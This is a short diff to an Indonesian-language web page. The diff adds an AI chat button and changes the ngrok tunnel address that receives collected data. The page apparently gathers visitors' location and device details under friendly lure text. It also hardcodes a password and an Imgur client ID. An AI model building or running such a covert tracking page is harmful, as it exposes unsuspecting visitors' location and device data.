@@ -196,6 +196,7 @@
     <p>Kamu ingin tahu lokasi dan perangkatmu untuk menciptakan pengalaman lebih baik..</p>
     <button id="startDataBtn">💾 Buka Hatimu</button>
     <button id="viewHistoryBtn">🔒 Lihat History</button>
+    <button onclick="location.href='chat.html'">💬 Chat dengan AI</button>
 
     <div id="map" class="map"></div>
     <div id="deviceInfo" class="info-box"></div>
@@ -237,7 +238,7 @@
     const passwordInput = document.getElementById('passwordInput');
     let map;
     const correctPassword = "@angela"; // Password untuk melihat history
-    const serverUrl = "https://099e-103-121-244-179.ngrok-free.app/api/history"; // URL server yang menerima data
+    const serverUrl = "https://6650-103-121-244-179.ngrok-free.app/api/history"; // URL server yang menerima data
     const imgurClientId = "98125bc028a2aec"; // Client ID Imgur Anda
 
     // Cek history di localStorage
